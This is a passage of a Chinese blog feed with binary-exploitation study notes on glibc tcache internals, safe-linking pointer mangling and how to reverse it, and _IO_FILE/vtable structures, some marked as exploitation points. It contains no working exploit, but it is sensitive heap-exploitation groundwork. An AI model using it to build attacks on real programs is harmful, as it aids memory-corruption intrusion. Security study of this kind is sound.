<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>此结构体为tcache的chunk，和一般的chunk比不会记录size字段，也许是不安全的隐患。但是会记录key字段，类似于canary（猜的）。entries数组记录了链表中最后一个chunk的地址，也就是说entries就是所谓的bin。</p>
<h1 id="关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义"><a href="#关于PROTECT-PTR-pos-ptr-和REVEAL-PTR-ptr-宏定义" class="headerlink" title="关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义"></a>关于PROTECT_PTR(pos, ptr)和REVEAL_PTR(ptr)宏定义</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>此宏定义会对bin链表中的指针进行混淆操作，具体方式就是低版本的指针的值与指针存储的位置&gt;&gt;12进行异或操作。若要恢复，就用结果值亦或指针存储的位置&gt;&gt;12即可，可得到正常的值。# tcache相关结构体</p>
<h1 id="tcache相关操作"><a href="#tcache相关操作" class="headerlink" title="tcache相关操作"></a>tcache相关操作</h1><blockquote>
<p>主要涉及到tcache_put和tcache_get，逻辑比较简单，不细说了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于IO_FILE的学习</title>
    <url>/2024/08/11/userpwn/%E5%85%B3%E4%BA%8EIO-FILE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="一些重要结构体和宏的定义"><a href="#一些重要结构体和宏的定义" class="headerlink" title="一些重要结构体和宏的定义"></a>一些重要结构体和宏的定义</h1><blockquote>
<p>一般放在头文件</p>
</blockquote>
<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a><code>_IO_FILE</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="comment">/*备份和回退操作*/</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"><span class="comment">/*标记所用*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/*IO CHAIN利用的关键点*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;<span class="comment">/*文件描述符*/</span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//补充说明</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A streammarker remembers a position in a buffer. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">next</span>;</span></span><br><span class="line">  FILE *_sbuf;</span><br><span class="line">  <span class="comment">/* If _pos &gt;= 0</span></span><br><span class="line"><span class="comment"> it points to _buf-&gt;Gbase()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="comment">/* if _pos &lt; 0, it points to _buf-&gt;eBptr()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="type">int</span> _pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a><code>flag</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number 验证file结构体的有效性*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits for the _flags2 field.  特殊扩展*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_MMAP 1 <span class="comment">/*如：mmap函数*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOTCANCEL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOCLOSE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_CLOEXEC 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NEED_LOCK 128</span></span><br></pre></td></tr></table></figure>



<h2 id="struct-IO-FILE-plus"><a href="#struct-IO-FILE-plus" class="headerlink" title="struct _IO_FILE_plus"></a><code>struct _IO_FILE_plus</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a><code>_IO_jump_t</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*_IO_finish_t等变量都为函数指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="一些重要结构体实例的定义"><a href="#一些重要结构体实例的定义" class="headerlink" title="一些重要结构体实例的定义"></a>一些重要结构体实例的定义</h1><blockquote>
<p>一般放在.c文件，在头文件中写好extern声明，即可调用不同.c文件中的函数，文件中定义比较散乱，此处定义跨越几个.c文件</p>
</blockquote>
<h2 id="IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr"><a href="#IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr" class="headerlink" title="IO_2_1_stdin, IO_2_1_stdout,and IO_2_1_stderr"></a><em>IO_2_1_stdin</em>, <em>IO_2_1_stdout</em>,and <em>IO_2_1_stderr</em></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span></span><br><span class="line"><span class="meta">       &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</span></span><br><span class="line"><span class="meta">	 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (FILE *) CHAIN, FD, \</span></span><br><span class="line"><span class="meta">	 0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</span></span><br><span class="line"><span class="meta">	 NULL, WDP, 0 &#125;</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;;</span></span><br><span class="line"></span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdin</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdout</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stderr</span></span><br><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）"><a href="#IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）" class="headerlink" title="_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）"></a>_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure>

<h2 id="虚表中各个函数的实现"><a href="#虚表中各个函数的实现" class="headerlink" title="虚表中各个函数的实现"></a>虚表中各个函数的实现</h2><blockquote>
<p>这是其他操作的基础，无论是库的读写接口，还是二次封装的printf之类的函数。</p>
</blockquote>
<p>………………………</p>
<h1 id="一些重要库内辅助函数的实现主要涉及（genops-c）"><a href="#一些重要库内辅助函数的实现主要涉及（genops-c）" class="headerlink" title="一些重要库内辅助函数的实现主要涉及（genops.c）"></a>一些重要库内辅助函数的实现主要涉及（genops.c）</h1><blockquote>
<p>本人比较菜，多线程锁机制基本没怎么考虑。</p>
<p>其中有的函数是对虚表函数的封装</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* _IO_list_all相关，将fp链接进入或链接出去_IO_list_all*/</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br></pre></td></tr></table></figure>

<h2 id="IO-cleanup-void"><a href="#IO-cleanup-void" class="headerlink" title="_IO_cleanup (void)"></a>_IO_cleanup (void)</h2><h3 id="函数主体-genops-c"><a href="#函数主体-genops-c" class="headerlink" title="函数主体(genops.c)"></a>函数主体(genops.c)</h3><blockquote>
<p>genops这个文件比较抽象，既包括了对外可以直接用的函数，也就是exit等函数会调用的函数，也包括了一些跳表函数实现起来的共同可以使用的函数。</p>
<p>exit函数在结束时会调用此函数，进行缓冲区的刷新和释放。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清空缓冲区操作，首先会关闭所有的c++的stream流缓冲区，接着执行 _IO_unbuffer_all ();*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 下面的处理有点复杂。通常，我们希望使流处于无缓冲状态，以确保随后所有的输出都能被看到。如果我们不关心内存泄漏的问题，那么实际上释放缓冲区并没有太大意义，因为程序终止后缓冲区会自动释放。如果我们确实关心内存泄漏问题，那么就必须释放这些缓冲区。是否释放缓冲区由位于 `libc_freeres` 部分的函数决定。这些函数与 `_IO_cleanup` 一样，都是作为 `atexit` 例程的一部分被调用。问题是我们不知道 `freeres` 代码和 `_IO_cleanup` 哪个会先被调用。如果 `freeres` 代码先被调用，我们将 `DEALLOC_BUFFER` 变量设置为 `true`，然后 `_IO_unbuffer_all` 函数会处理剩下的工作。如果 `_IO_unbuffer_all` 先被调用，我们会将流添加到一个列表中，以便 `freeres` 函数稍后可以遍历该列表。*/</span></span><br><span class="line"><span class="comment">/*legacy为兼容老版本所需*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*注意for循环，一开始没看见想了半天哈哈哈*/</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">	legacy = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">	  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">	  &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">	  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">	    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">		 stream.  */</span></span><br><span class="line">	      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">	    &#123;</span><br><span class="line">	      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">	      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">	      freeres_list = fp;</span><br><span class="line">	      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">	    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">	    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">	 used.  */</span></span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">	fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

